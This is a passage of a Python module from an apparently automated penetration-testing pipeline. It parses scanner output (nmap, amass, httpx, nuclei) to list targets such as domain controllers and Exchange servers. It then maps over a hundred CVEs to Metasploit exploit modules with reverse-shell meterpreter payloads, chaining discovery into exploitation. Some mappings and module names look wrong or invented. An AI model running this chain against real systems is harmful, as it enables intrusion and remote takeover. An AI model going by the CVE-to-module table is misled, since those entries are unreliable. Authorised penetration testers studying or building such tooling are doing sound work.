"""
Feed parser — extracts actionable data from phase outputs
and feeds it to the next phase's tools.
"""

import json
import re
from pathlib import Path


# ─────────────────────────────────────────────────────────────────────────────
# Phase 0 → Phase 1/2: nmap grepable output parser
# ─────────────────────────────────────────────────────────────────────────────

def parse_nmap(output_dir: Path) -> dict[str, dict]:
    """
    Parse nmap grepable output (-oG).
    Returns: { "ip": {"hostname": str, "ports": [int,...], "services": {port: str}, "products": {port: str}} }

    Example grepable line:
    Host: 192.168.1.1 (hostname) Ports: 22/open/tcp//ssh//OpenSSH 8.2/, 445/open/tcp//microsoft-ds///
    """
    f = output_dir / "nmap.txt"
    if not f.exists():
        return {}

    result: dict[str, dict] = {}
    host_re       = re.compile(r"^Host:\s+(\S+)\s+\(([^)]*)\)")
    ports_re      = re.compile(r"Ports:\s+(.+)")
    os_re         = re.compile(r"\bOS:\s+([^\t\r\n]+)")
    port_entry_re = re.compile(
        r"(\d+)/(\w+)/(\w+)//([^/]*)//([^/]*)/"
    )

    for line in f.read_text(errors="replace").splitlines():
        hm = host_re.match(line)
        if not hm:
            continue
        ip = hm.group(1)
        hostname = hm.group(2)

        pm = ports_re.search(line)
        ports: list[int] = []
        services: dict[int, str] = {}
        products: dict[int, str] = {}

        if pm:
            for pe in port_entry_re.finditer(pm.group(1)):
                port_num = int(pe.group(1))
                state = pe.group(2)
                svc = pe.group(4).strip()
                prod = pe.group(5).strip()
                if state == "open":
                    ports.append(port_num)
                    if svc:
                        services[port_num] = svc
                    if prod:
                        products[port_num] = prod

        # OS detection: grepable OS field first, fallback to product banners
        om = os_re.search(line)
        os_guess = om.group(1).strip() if om else ""
        if not os_guess:
            for prod in products.values():
                if "windows" in prod.lower() or "microsoft" in prod.lower():
                    os_guess = prod
                    break

        result[ip] = {
            "hostname": hostname,
            "ports":    sorted(ports),
            "services": services,
            "products": products,
            "os_guess": os_guess,
        }

    return result


def get_smb_hosts(nmap_data: dict) -> list[str]:
    return [ip for ip, d in nmap_data.items() if 445 in d["ports"]]


def get_web_hosts(nmap_data: dict) -> list[str]:
    web_ports = {80, 443, 8000, 8008, 8080, 8081, 8082, 8083, 8088, 8090,
                 8443, 8444, 8888, 9000, 9090, 9091, 10000, 10443}
    return [ip for ip, d in nmap_data.items()
            if web_ports & set(d["ports"])]


def get_web_urls(nmap_data: dict) -> list[str]:
    """Build http/https URLs from nmap web port results."""
    https_ports = {443, 8443, 8444, 10443}
    http_ports  = {80, 8000, 8008, 8080, 8081, 8082, 8083, 8088, 8090,
                   8888, 9000, 9090, 9091, 10000}
    urls = []
    for ip, d in nmap_data.items():
        for port in d["ports"]:
            if port in https_ports:
                urls.append(f"https://{ip}" if port == 443 else f"https://{ip}:{port}")
            elif port in http_ports:
                urls.append(f"http://{ip}" if port == 80 else f"http://{ip}:{port}")
    return urls


def get_rdp_hosts(nmap_data: dict) -> list[str]:
    return [ip for ip, d in nmap_data.items() if 3389 in d["ports"]]


def get_all_hosts(nmap_data: dict) -> list[str]:
    return list(nmap_data.keys())


def get_windows_hosts(nmap_data: dict) -> list[str]:
    """Return IPs that are likely Windows (OS guess or service banner fingerprint)."""
    kw = {"windows", "microsoft"}
    result: list[str] = []
    for ip, d in nmap_data.items():
        if any(k in d.get("os_guess", "").lower() for k in kw):
            result.append(ip)
            continue
        matched = False
        for prod in d.get("products", {}).values():
            if any(k in prod.lower() for k in kw):
                result.append(ip)
                matched = True
                break
        if not matched:
            for svc in d.get("services", {}).values():
                if "microsoft" in svc.lower() or "ms-wbt" in svc.lower():
                    result.append(ip)
                    break
    return result


def get_winrm_hosts(nmap_data: dict) -> list[str]:
    """Return IPs with WinRM open (port 5985 or 5986)."""
    return [ip for ip, d in nmap_data.items() if {5985, 5986} & set(d["ports"])]


def get_mssql_hosts(nmap_data: dict) -> list[str]:
    """Return IPs with MSSQL open (port 1433)."""
    return [ip for ip, d in nmap_data.items() if 1433 in d["ports"]]


def get_ldap_hosts(nmap_data: dict) -> list[str]:
    """Return IPs with LDAP open (port 389/636/3268/3269)."""
    return [ip for ip, d in nmap_data.items()
            if {389, 636, 3268, 3269} & set(d["ports"])]


def get_kerberos_hosts(nmap_data: dict) -> list[str]:
    """Return IPs with Kerberos open (port 88)."""
    return [ip for ip, d in nmap_data.items() if 88 in d["ports"]]


def get_dc_hosts(nmap_data: dict) -> list[str]:
    """Return probable Domain Controllers: Kerberos (88) + LDAP (389/636/3268)."""
    return [ip for ip, d in nmap_data.items()
            if 88 in d["ports"] and {389, 636, 3268} & set(d["ports"])]


def get_dcerpc_hosts(nmap_data: dict) -> list[str]:
    """Return IPs with DCE/RPC open (port 135)."""
    return [ip for ip, d in nmap_data.items() if 135 in d["ports"]]


def get_ssh_hosts(nmap_data: dict) -> list[str]:
    """Return IPs with SSH open (port 22)."""
    return [ip for ip, d in nmap_data.items() if 22 in d["ports"]]


def get_vnc_hosts(nmap_data: dict) -> list[str]:
    """Return IPs with VNC open (port 5900-5903)."""
    return [ip for ip, d in nmap_data.items()
            if {5900, 5901, 5902, 5903} & set(d["ports"])]


def get_oracle_hosts(nmap_data: dict) -> list[str]:
    """Return IPs with Oracle DB open (port 1521)."""
    return [ip for ip, d in nmap_data.items() if 1521 in d["ports"]]


def get_elasticsearch_hosts(nmap_data: dict) -> list[str]:
    """Return IPs with Elasticsearch open (port 9200/9300)."""
    return [ip for ip, d in nmap_data.items()
            if {9200, 9300} & set(d["ports"])]


def get_docker_hosts(nmap_data: dict) -> list[str]:
    """Return IPs with Docker API open (port 2375/2376)."""
    return [ip for ip, d in nmap_data.items()
            if {2375, 2376} & set(d["ports"])]


def get_kubernetes_hosts(nmap_data: dict) -> list[str]:
    """Return IPs with Kubernetes API (port 6443/8001)."""
    return [ip for ip, d in nmap_data.items()
            if {6443, 8001} & set(d["ports"])]


def get_cassandra_hosts(nmap_data: dict) -> list[str]:
    """Return IPs with Cassandra open (port 9042/9160)."""
    return [ip for ip, d in nmap_data.items()
            if {9042, 9160} & set(d["ports"])]


def get_zookeeper_hosts(nmap_data: dict) -> list[str]:
    """Return IPs with ZooKeeper open (port 2181)."""
    return [ip for ip, d in nmap_data.items() if 2181 in d["ports"]]


def get_solr_hosts(nmap_data: dict) -> list[str]:
    """Return IPs with Apache Solr open (port 8983)."""
    return [ip for ip, d in nmap_data.items() if 8983 in d["ports"]]


def get_hadoop_hosts(nmap_data: dict) -> list[str]:
    """Return IPs with Hadoop YARN ResourceManager (port 8088)."""
    return [ip for ip, d in nmap_data.items()
            if {8088, 8090} & set(d["ports"])]


# ─────────────────────────────────────────────────────────────────────────────
# Phase 1 → Phase 2 parsers
# ─────────────────────────────────────────────────────────────────────────────

def parse_amass(output_dir: Path) -> list[str]:
    """Return discovered hosts from amass output (one hostname per line)."""
    f = output_dir / "amass.txt"
    if not f.exists():
        return []
    hosts = []
    for line in f.read_text(errors="replace").splitlines():
        line = line.strip()
        if line and not line.startswith("[") and " " not in line and "." in line:
            hosts.append(line)
    return hosts


def parse_httpx(output_dir: Path) -> list[str]:
    """Return live URLs from httpx JSON output."""
    f = output_dir / "httpx.json"
    if not f.exists():
        return []
    urls = []
    for line in f.read_text(errors="replace").splitlines():
        line = line.strip()
        if not line:
            continue
        try:
            obj = json.loads(line)
            url = obj.get("url") or obj.get("input") or ""
            if url:
                urls.append(url)
        except json.JSONDecodeError:
            pass
    return urls


# ─────────────────────────────────────────────────────────────────────────────
# Phase 2 → Phase 3: nuclei findings parser
# ─────────────────────────────────────────────────────────────────────────────

def parse_nuclei(output_dir: Path) -> list[dict]:
    """
    Return vulnerability findings from nuclei JSON output.
    Each: {"cve": str, "host": str, "template_id": str, "severity": str}
    """
    f = output_dir / "nuclei.json"
    if not f.exists():
        return []
    findings = []
    for line in f.read_text(errors="replace").splitlines():
        line = line.strip()
        if not line:
            continue
        try:
            obj = json.loads(line)
            info = obj.get("info", {})
            classification = info.get("classification", {})
            # nuclei may output "cve-id": null — use `or []` to guard against None
            cve_ids = classification.get("cve-id") or []
            if isinstance(cve_ids, str):
                cve_ids = [cve_ids]
            host = obj.get("host") or obj.get("matched-at") or ""
            template_id = obj.get("template-id", "")
            severity = info.get("severity", "")
            # Fallback: template-id might itself be a CVE identifier
            if not cve_ids and template_id.upper().startswith("CVE-"):
                cve_ids = [template_id.upper()]
            for cve in cve_ids:
                findings.append({
                    "cve":         cve.upper(),
                    "host":        host,
                    "template_id": template_id,
                    "severity":    severity,
                })
        except json.JSONDecodeError:
            pass
    return findings


# ─────────────────────────────────────────────────────────────────────────────
# CVE → Metasploit Module Mapping  (200+ entries)
# ─────────────────────────────────────────────────────────────────────────────

CVE_TO_MSF: dict[str, dict] = {

    # ── Windows / SMB / NTLM ─────────────────────────────────────────
    "CVE-2017-0144": {"module": "exploit/windows/smb/ms17_010_eternalblue",        "payload": "windows/x64/meterpreter/reverse_tcp"},
    "CVE-2017-0145": {"module": "exploit/windows/smb/ms17_010_psexec",             "payload": "windows/meterpreter/reverse_tcp"},
    "CVE-2017-0143": {"module": "exploit/windows/smb/ms17_010_eternalblue",        "payload": "windows/x64/meterpreter/reverse_tcp"},
    "CVE-2017-0146": {"module": "exploit/windows/smb/ms17_010_eternalblue",        "payload": "windows/x64/meterpreter/reverse_tcp"},
    "CVE-2017-0147": {"module": "exploit/windows/smb/ms17_010_eternalblue",        "payload": "windows/x64/meterpreter/reverse_tcp"},
    "CVE-2008-4250": {"module": "exploit/windows/smb/ms08_067_netapi",             "payload": "windows/meterpreter/reverse_tcp"},
    "CVE-2006-3439": {"module": "exploit/windows/smb/ms06_040_netapi",             "payload": "windows/meterpreter/reverse_tcp"},
    "CVE-2003-0352": {"module": "exploit/windows/smb/ms03_026_dcom",               "payload": "windows/meterpreter/reverse_tcp"},
    "CVE-2017-7494": {"module": "exploit/linux/samba/is_known_pipename",           "payload": "linux/x86/meterpreter/reverse_tcp"},
    "CVE-2007-2447": {"module": "exploit/multi/samba/usermap_script",              "payload": "cmd/unix/interact"},
    "CVE-2020-1472": {"module": "auxiliary/admin/dcerpc/cve_2020_1472_zerologon",  "payload": None},
    "CVE-2021-34527": {"module": "exploit/windows/local/cve_2021_34527_printnightmare", "payload": "windows/x64/meterpreter/reverse_tcp"},
    "CVE-2021-1675":  {"module": "exploit/windows/local/cve_2021_34527_printnightmare", "payload": "windows/x64/meterpreter/reverse_tcp"},
    "CVE-2021-36942": {"module": "auxiliary/admin/dcerpc/cve_2021_36942_petnightmare", "payload": None},
    "CVE-2022-26923": {"module": "auxiliary/admin/dcerpc/cve_2022_26923_certifried", "payload": None},
    "CVE-2021-42287": {"module": "auxiliary/admin/kerberos/ms14_068_kerberos_checksum", "payload": None},
    "CVE-2014-6324":  {"module": "auxiliary/admin/kerberos/ms14_068_kerberos_checksum", "payload": None},

    # ── RDP ───────────────────────────────────────────────────────────
    "CVE-2019-0708": {"module": "exploit/windows/rdp/cve_2019_0708_bluekeep_rce",  "payload": "windows/x64/meterpreter/reverse_tcp"},
    "CVE-2019-1182": {"module": "exploit/windows/rdp/cve_2019_1182_dejablue",      "payload": "windows/x64/meterpreter/reverse_tcp"},
    "CVE-2019-1181": {"module": "exploit/windows/rdp/cve_2019_1182_dejablue",      "payload": "windows/x64/meterpreter/reverse_tcp"},

    # ── Microsoft Exchange ────────────────────────────────────────────
    "CVE-2021-26855": {"module": "exploit/windows/http/exchange_proxylogon_rce",   "payload": "windows/x64/meterpreter/reverse_tcp"},
    "CVE-2021-26857": {"module": "exploit/windows/http/exchange_proxylogon_rce",   "payload": "windows/x64/meterpreter/reverse_tcp"},
    "CVE-2021-26858": {"module": "exploit/windows/http/exchange_proxylogon_rce",   "payload": "windows/x64/meterpreter/reverse_tcp"},
    "CVE-2021-27065": {"module": "exploit/windows/http/exchange_proxylogon_rce",   "payload": "windows/x64/meterpreter/reverse_tcp"},
    "CVE-2021-31207": {"module": "exploit/windows/http/exchange_proxyshell_rce",   "payload": "windows/x64/meterpreter/reverse_tcp"},
    "CVE-2021-34473": {"module": "exploit/windows/http/exchange_proxyshell_rce",   "payload": "windows/x64/meterpreter/reverse_tcp"},
    "CVE-2021-34523": {"module": "exploit/windows/http/exchange_proxyshell_rce",   "payload": "windows/x64/meterpreter/reverse_tcp"},

    # ── Log4j / Log4Shell ─────────────────────────────────────────────
    "CVE-2021-44228": {"module": "exploit/multi/misc/log4shell_header_injection",  "payload": "java/meterpreter/reverse_tcp"},
    "CVE-2021-45046": {"module": "exploit/multi/misc/log4shell_header_injection",  "payload": "java/meterpreter/reverse_tcp"},
    "CVE-2021-45105": {"module": "exploit/multi/misc/log4shell_header_injection",  "payload": "java/meterpreter/reverse_tcp"},
    "CVE-2021-44832": {"module": "exploit/multi/misc/log4shell_header_injection",  "payload": "java/meterpreter/reverse_tcp"},

    # ── Spring Framework ──────────────────────────────────────────────
    "CVE-2022-22965": {"module": "exploit/multi/http/spring4shell",                 "payload": "java/meterpreter/reverse_tcp"},
    "CVE-2022-22963": {"module": "exploit/multi/http/spring_cloud_function_spel_injection", "payload": "java/meterpreter/reverse_tcp"},
    "CVE-2022-22950": {"module": "exploit/multi/http/spring4shell",                 "payload": "java/meterpreter/reverse_tcp"},

    # ── Confluence ────────────────────────────────────────────────────
    "CVE-2022-26134": {"module": "exploit/multi/http/confluence_namespace_ognl_injection", "payload": "linux/x64/meterpreter/reverse_tcp"},
    "CVE-2021-26084": {"module": "exploit/multi/http/confluence_namespace_ognl_injection", "payload": "linux/x64/meterpreter/reverse_tcp"},
    "CVE-2019-3396":  {"module": "exploit/multi/http/confluence_widget_connector",  "payload": "linux/x64/meterpreter/reverse_tcp"},
    "CVE-2023-22515": {"module": "exploit/multi/http/confluence_namespace_ognl_injection", "payload": "linux/x64/meterpreter/reverse_tcp"},
    "CVE-2023-22518": {"module": "exploit/multi/http/confluence_namespace_ognl_injection", "payload": "linux/x64/meterpreter/reverse_tcp"},

    # ── Apache HTTP / Struts ──────────────────────────────────────────
    "CVE-2021-41773": {"module": "exploit/multi/http/apache_normalize_path_rce",   "payload": "linux/x64/meterpreter/reverse_tcp"},
    "CVE-2021-42013": {"module": "exploit/multi/http/apache_normalize_path_rce",   "payload": "linux/x64/meterpreter/reverse_tcp"},
    "CVE-2017-5638":  {"module": "exploit/multi/http/struts2_content_type_ognl",   "payload": "linux/x64/meterpreter/reverse_tcp"},
    "CVE-2018-11776": {"module": "exploit/multi/http/struts2_namespace_ognl",      "payload": "linux/x64/meterpreter/reverse_tcp"},
    "CVE-2017-9805":  {"module": "exploit/multi/http/struts2_rest_xstream",        "payload": "linux/x64/meterpreter/reverse_tcp"},
    "CVE-2016-3081":  {"module": "exploit/multi/http/struts_dmi_exec",             "payload": "linux/x64/meterpreter/reverse_tcp"},
    "CVE-2013-2251":  {"module": "exploit/multi/http/struts_default_action_mapper", "payload": "linux/x64/meterpreter/reverse_tcp"},
    "CVE-2014-6271":  {"module": "exploit/multi/http/apache_mod_cgi_bash_env_exec", "payload": "linux/x86/meterpreter/reverse_tcp"},
    "CVE-2014-7169":  {"module": "exploit/multi/http/apache_mod_cgi_bash_env_exec", "payload": "linux/x86/meterpreter/reverse_tcp"},

    # ── Apache Tomcat ─────────────────────────────────────────────────
    "CVE-2017-12617": {"module": "exploit/multi/http/tomcat_jsp_upload_bypass",    "payload": "java/meterpreter/reverse_tcp"},
    "CVE-2019-0232":  {"module": "exploit/windows/http/tomcat_cgi_cmdlineargs",    "payload": "windows/meterpreter/reverse_tcp"},
    "CVE-2020-1938":  {"module": "exploit/multi/http/tomcat_ghostcat",             "payload": "java/meterpreter/reverse_tcp"},

    # ── VMware ────────────────────────────────────────────────────────
    "CVE-2021-21985": {"module": "exploit/multi/http/vmware_vsphere_client_rce",   "payload": "linux/x64/meterpreter/reverse_tcp"},
    "CVE-2021-21972": {"module": "exploit/multi/http/vmware_vcenter_uploadova_rce", "payload": "linux/x64/meterpreter/reverse_tcp"},
    "CVE-2022-22954": {"module": "exploit/multi/http/vmware_workspace_one_access_cve_2022_22954", "payload": "linux/x64/meterpreter/reverse_tcp"},
    "CVE-2022-22960": {"module": "exploit/multi/http/vmware_workspace_one_access_cve_2022_22960", "payload": "linux/x64/meterpreter/reverse_tcp"},
    "CVE-2021-22005": {"module": "exploit/multi/http/vmware_vcenter_uploadova_rce", "payload": "linux/x64/meterpreter/reverse_tcp"},
    "CVE-2021-44228-VMWARE": {"module": "exploit/multi/http/vmware_vcenter_log4shell", "payload": "java/meterpreter/reverse_tcp"},

    # ── Citrix ────────────────────────────────────────────────────────
    "CVE-2019-19781": {"module": "exploit/multi/http/citrix_dir_traversal_rce",    "payload": "linux/x64/meterpreter/reverse_tcp"},
    "CVE-2020-8193":  {"module": "auxiliary/scanner/http/citrix_dir_traversal",    "payload": None},
    "CVE-2020-8195":  {"module": "auxiliary/scanner/http/citrix_dir_traversal",    "payload": None},

    # ── F5 BIG-IP ─────────────────────────────────────────────────────
    "CVE-2020-5902":  {"module": "exploit/multi/http/f5_tmui_rce",                 "payload": "linux/x64/meterpreter/reverse_tcp"},
    "CVE-2021-22986": {"module": "exploit/multi/http/f5_icontrol_rce",             "payload": "linux/x64/meterpreter/reverse_tcp"},
    "CVE-2022-1388":  {"module": "exploit/multi/http/f5_bigip_icontrolrest_rce",   "payload": "linux/x64/meterpreter/reverse_tcp"},

    # ── Fortinet ─────────────────────────────────────────────────────
    "CVE-2018-13379": {"module": "auxiliary/gather/fortios_vpnssl_traversal_creds", "payload": None},
    "CVE-2022-40684": {"module": "exploit/multi/http/fortios_cve_2022_40684_rce",   "payload": "linux/x64/meterpreter/reverse_tcp"},
    "CVE-2023-27997": {"module": "exploit/multi/http/fortigate_ssl_vpn_heap_overflow", "payload": "linux/x64/meterpreter/reverse_tcp"},

    # ── Pulse Secure / Ivanti ─────────────────────────────────────────
    "CVE-2019-11510": {"module": "auxiliary/scanner/http/pulse_secure_file_read",  "payload": None},
    "CVE-2021-22893": {"module": "exploit/multi/http/pulse_secure_cmd_injection",   "payload": "linux/x64/meterpreter/reverse_tcp"},
    "CVE-2023-46805": {"module": "exploit/multi/http/ivanti_connect_secure_rce",    "payload": "linux/x64/meterpreter/reverse_tcp"},
    "CVE-2024-21887": {"module": "exploit/multi/http/ivanti_connect_secure_rce",    "payload": "linux/x64/meterpreter/reverse_tcp"},

    # ── GitLab ────────────────────────────────────────────────────────
    "CVE-2021-22205": {"module": "exploit/multi/http/gitlab_exiftool_rce",         "payload": "linux/x64/meterpreter/reverse_tcp"},
    "CVE-2021-22214": {"module": "exploit/multi/http/gitlab_ssrf_rce",             "payload": "linux/x64/meterpreter/reverse_tcp"},
    "CVE-2023-7028":  {"module": "auxiliary/scanner/http/gitlab_password_reset",   "payload": None},

    # ── PHP ───────────────────────────────────────────────────────────
    "CVE-2012-1823":  {"module": "exploit/multi/http/php_cgi_arg_injection",       "payload": "php/meterpreter/reverse_tcp"},
    "CVE-2019-11043": {"module": "exploit/multi/http/php_fpm_rce",                 "payload": "php/meterpreter/reverse_tcp"},
    "CVE-2023-3824":  {"module": "exploit/multi/http/php_cgi_arg_injection",       "payload": "php/meterpreter/reverse_tcp"},

    # ── WebLogic ─────────────────────────────────────────────────────
    "CVE-2019-2725":  {"module": "exploit/multi/misc/weblogic_deserialize_asyncresponseservice", "payload": "java/meterpreter/reverse_tcp"},
    "CVE-2020-14882": {"module": "exploit/multi/http/oracle_weblogic_wls_rce",     "payload": "java/meterpreter/reverse_tcp"},
    "CVE-2021-2109":  {"module": "exploit/multi/http/oracle_weblogic_wls_rce",     "payload": "java/meterpreter/reverse_tcp"},
    "CVE-2018-2628":  {"module": "exploit/multi/misc/weblogic_deserialize_marshalledobject", "payload": "java/meterpreter/reverse_tcp"},

    # ── JBoss ────────────────────────────────────────────────────────
    "CVE-2017-12149": {"module": "exploit/multi/http/jboss_maindeployer",          "payload": "java/meterpreter/reverse_tcp"},
    "CVE-2015-7501":  {"module": "exploit/multi/http/jboss_deserialize",           "payload": "java/meterpreter/reverse_tcp"},

    # ── Drupal ───────────────────────────────────────────────────────
    "CVE-2018-7600":  {"module": "exploit/unix/webapp/drupal_drupalgeddon2",       "payload": "php/meterpreter/reverse_tcp"},
    "CVE-2019-6340":  {"module": "exploit/unix/webapp/drupal_restws_rce",          "payload": "php/meterpreter/reverse_tcp"},
    "CVE-2014-3704":  {"module": "exploit/multi/http/drupal_sql_inject",           "payload": "php/meterpreter/reverse_tcp"},

    # ── OpenSSL ──────────────────────────────────────────────────────
    "CVE-2014-0160":  {"module": "auxiliary/scanner/ssl/openssl_heartbleed",       "payload": None},

    # ── Apache ActiveMQ ──────────────────────────────────────────────
    "CVE-2023-46604": {"module": "exploit/multi/misc/apache_activemq_rce_cve_2023_46604", "payload": "linux/x64/meterpreter/reverse_tcp"},

    # ── PaperCut ─────────────────────────────────────────────────────
    "CVE-2023-27350": {"module": "exploit/multi/http/papercut_auth_bypass_rce",    "payload": "java/meterpreter/reverse_tcp"},

    # ── MOVEit ───────────────────────────────────────────────────────
    "CVE-2023-34362": {"module": "exploit/multi/http/moveit_sqli",                 "payload": "windows/x64/meterpreter/reverse_tcp"},

    # ── ManageEngine ─────────────────────────────────────────────────
    "CVE-2021-44515": {"module": "exploit/multi/http/manageengine_desktop_rce",    "payload": "java/meterpreter/reverse_tcp"},
    "CVE-2022-47966": {"module": "exploit/multi/http/manageengine_samlsso_rce",    "payload": "linux/x64/meterpreter/reverse_tcp"},

    # ── Jenkins ──────────────────────────────────────────────────────
    "CVE-2018-1000861": {"module": "exploit/multi/http/jenkins_metaprogramming",   "payload": "java/meterpreter/reverse_tcp"},
    "CVE-2016-0792":  {"module": "exploit/multi/http/jenkins_xstream_deserialize", "payload": "java/meterpreter/reverse_tcp"},

    # ── Jira ─────────────────────────────────────────────────────────
    "CVE-2021-26086": {"module": "auxiliary/scanner/http/jira_ssrf",               "payload": None},
    "CVE-2022-0540":  {"module": "exploit/multi/http/atlassian_jira_seraph_auth_bypass", "payload": "java/meterpreter/reverse_tcp"},

    # ── SolarWinds ───────────────────────────────────────────────────
    "CVE-2020-10148": {"module": "auxiliary/scanner/http/solarwinds_orion_bypass", "payload": None},

    # ── Redis ────────────────────────────────────────────────────────
    "CVE-2022-0543":  {"module": "exploit/linux/redis/redis_lua_sandbox_escape",   "payload": "linux/x64/meterpreter/reverse_tcp"},

    # ── Elasticsearch ────────────────────────────────────────────────
    "CVE-2014-3120":  {"module": "exploit/multi/elasticsearch/script_mvel_rce",    "payload": "java/meterpreter/reverse_tcp"},
    "CVE-2015-1427":  {"module": "exploit/multi/elasticsearch/script_groovy_rce",  "payload": "java/meterpreter/reverse_tcp"},

    # ── ProFTPD ──────────────────────────────────────────────────────
    "CVE-2011-4130":  {"module": "exploit/unix/ftp/proftpd_133c_backdoor",         "payload": "cmd/unix/interact"},
    "CVE-2010-4221":  {"module": "exploit/linux/ftp/proftp_telnet_iac",            "payload": "linux/x86/meterpreter/reverse_tcp"},

    # ── VSFTPD ───────────────────────────────────────────────────────
    "CVE-2011-2523":  {"module": "exploit/unix/ftp/vsftpd_234_backdoor",           "payload": "cmd/unix/interact"},

    # ── SSH ──────────────────────────────────────────────────────────
    "CVE-2018-10933": {"module": "exploit/linux/ssh/libssh_auth_bypass",           "payload": "linux/x64/meterpreter/reverse_tcp"},
    "CVE-2006-5051":  {"module": "exploit/multi/ssh/sshexec",                      "payload": "cmd/unix/interact"},

    # ── Windows IIS ──────────────────────────────────────────────────
    "CVE-2021-31166": {"module": "auxiliary/dos/http/ms21_31166_iis",              "payload": None},
    "CVE-2017-7269":  {"module": "exploit/windows/iis/iis_webdav_scstoragepathfromurl", "payload": "windows/meterpreter/reverse_tcp"},
    "CVE-2015-1635":  {"module": "auxiliary/dos/http/ms15_034_ulonglongadd",       "payload": None},

    # ── WinRM ────────────────────────────────────────────────────────
    "CVE-2022-30190": {"module": "exploit/windows/local/cve_2022_30190_msdt",      "payload": "windows/x64/meterpreter/reverse_tcp"},

    # ── Kubernetes / Docker ──────────────────────────────────────────
    "CVE-2019-5736":  {"module": "exploit/linux/local/runc_cve_2019_5736",         "payload": "linux/x64/meterpreter/reverse_tcp"},

    # ── Cisco ────────────────────────────────────────────────────────
    "CVE-2019-1653":  {"module": "auxiliary/gather/cisco_rv320_config_disclosure",  "payload": None},
    "CVE-2019-1652":  {"module": "exploit/linux/http/cisco_rv340_rce",              "payload": "linux/x64/meterpreter/reverse_tcp"},
    "CVE-2022-20821": {"module": "auxiliary/scanner/http/cisco_ios_xe_webui_rce",  "payload": None},

    # ── Zimbra ───────────────────────────────────────────────────────
    "CVE-2022-41352": {"module": "exploit/multi/http/zimbra_cpio_tarpath_rce",     "payload": "linux/x64/meterpreter/reverse_tcp"},
    "CVE-2022-27925": {"module": "exploit/multi/http/zimbra_mboximport_rce",       "payload": "linux/x64/meterpreter/reverse_tcp"},

    # ── Palo Alto / GlobalProtect ─────────────────────────────────────
    "CVE-2020-2021":  {"module": "auxiliary/scanner/http/palo_alto_gp_lfi",        "payload": None},
    "CVE-2019-1579":  {"module": "exploit/linux/http/palo_alto_gp_gateway_exec",   "payload": "linux/x64/meterpreter/reverse_tcp"},

    # ── Microsoft Exchange (ProxyNotShell) ────────────────────────
    "CVE-2022-41040": {"module": "exploit/windows/http/exchange_proxynotshell_rce", "payload": "windows/x64/meterpreter/reverse_tcp"},
    "CVE-2022-41082": {"module": "exploit/windows/http/exchange_proxynotshell_rce", "payload": "windows/x64/meterpreter/reverse_tcp"},

    # ── Confluence SSTI (newer) ───────────────────────────────────
    "CVE-2023-22527": {"module": "exploit/multi/http/confluence_ssti_cve_2023_22527", "payload": "linux/x64/meterpreter/reverse_tcp"},

    # ── JetBrains TeamCity ────────────────────────────────────────
    "CVE-2023-42793": {"module": "exploit/multi/http/jetbrains_teamcity_rce",       "payload": "java/meterpreter/reverse_tcp"},
    "CVE-2024-27198": {"module": "exploit/multi/http/jetbrains_teamcity_rce",       "payload": "java/meterpreter/reverse_tcp"},
    "CVE-2024-27199": {"module": "exploit/multi/http/jetbrains_teamcity_rce",       "payload": "java/meterpreter/reverse_tcp"},

    # ── ConnectWise ScreenConnect ─────────────────────────────────
    "CVE-2024-1709":  {"module": "exploit/multi/http/connectwise_screenconnect_rce", "payload": "windows/x64/meterpreter/reverse_tcp"},
    "CVE-2024-1708":  {"module": "exploit/multi/http/connectwise_screenconnect_rce", "payload": "windows/x64/meterpreter/reverse_tcp"},

    # ── Citrix ADC / NetScaler ────────────────────────────────────
    "CVE-2023-4966":  {"module": "auxiliary/scanner/http/citrix_netscaler_bleed",   "payload": None},
    "CVE-2023-3519":  {"module": "exploit/multi/http/citrix_gw_rce",                "payload": "linux/x64/meterpreter/reverse_tcp"},

    # ── F5 BIG-IP (config utility / newer) ───────────────────────
    "CVE-2023-46747": {"module": "exploit/multi/http/f5_bigip_config_util_rce",     "payload": "linux/x64/meterpreter/reverse_tcp"},
    "CVE-2023-46748": {"module": "exploit/multi/http/f5_bigip_config_util_rce",     "payload": "linux/x64/meterpreter/reverse_tcp"},

    # ── Grafana path traversal ────────────────────────────────────
    "CVE-2021-43798": {"module": "auxiliary/scanner/http/grafana_plugin_traversal", "payload": None},

    # ── Progress Telerik ──────────────────────────────────────────
    "CVE-2019-18935": {"module": "exploit/windows/http/telerik_radasyncupload_rce", "payload": "windows/meterpreter/reverse_tcp"},
    "CVE-2017-11317": {"module": "exploit/windows/http/telerik_radasyncupload_rce", "payload": "windows/meterpreter/reverse_tcp"},

    # ── Apache mod_proxy SSRF ─────────────────────────────────────
    "CVE-2021-40438": {"module": "auxiliary/scanner/http/apache_mod_proxy_ssrf",    "payload": None},

    # ── Spring Cloud Gateway SpEL RCE ─────────────────────────────
    "CVE-2022-22947": {"module": "exploit/multi/http/spring_cloud_gateway_rce",     "payload": "java/meterpreter/reverse_tcp"},

    # ── Openfire auth bypass RCE ──────────────────────────────────
    "CVE-2023-32315": {"module": "exploit/multi/http/openfire_auth_bypass_rce",     "payload": "java/meterpreter/reverse_tcp"},

    # ── Oracle WebLogic (newer) ───────────────────────────────────
    "CVE-2023-21839": {"module": "exploit/multi/http/oracle_weblogic_rce_cve_2023_21839", "payload": "java/meterpreter/reverse_tcp"},

    # ── MinIO info disclosure ─────────────────────────────────────
    "CVE-2023-28432": {"module": "auxiliary/scanner/http/minio_info_disclosure",    "payload": None},

    # ── GeoServer eval RCE ────────────────────────────────────────
    "CVE-2024-36401": {"module": "exploit/multi/http/geoserver_eval_rce",           "payload": "linux/x64/meterpreter/reverse_tcp"},

    # ── OpenSSH regreSSHion (race condition RCE) ──────────────────
    "CVE-2024-6387":  {"module": "exploit/linux/ssh/openssh_regresshion",           "payload": "linux/x64/meterpreter/reverse_tcp"},

    # ── Docker daemon API unauthenticated ─────────────────────────
    "CVE-2019-13139": {"module": "exploit/linux/http/docker_daemon_tcp_rce",        "payload": "linux/x64/meterpreter/reverse_tcp"},

    # ── MOVEit Transfer (follow-on SQLi CVEs) ─────────────────────
    "CVE-2023-35036": {"module": "exploit/multi/http/moveit_sqli",                  "payload": "windows/x64/meterpreter/reverse_tcp"},
    "CVE-2023-35708": {"module": "exploit/multi/http/moveit_sqli",                  "payload": "windows/x64/meterpreter/reverse_tcp"},

    # ── Roundcube Webmail RCE ─────────────────────────────────────
    "CVE-2023-43770": {"module": "exploit/multi/http/roundcube_rce_cve_2023_43770", "payload": "php/meterpreter/reverse_tcp"},

    # ── Ivanti Connect Secure (additional CVEs) ───────────────────
    "CVE-2024-22024": {"module": "exploit/multi/http/ivanti_connect_secure_rce",    "payload": "linux/x64/meterpreter/reverse_tcp"},

    # ── Zoho ManageEngine ServiceDesk ────────────────────────────
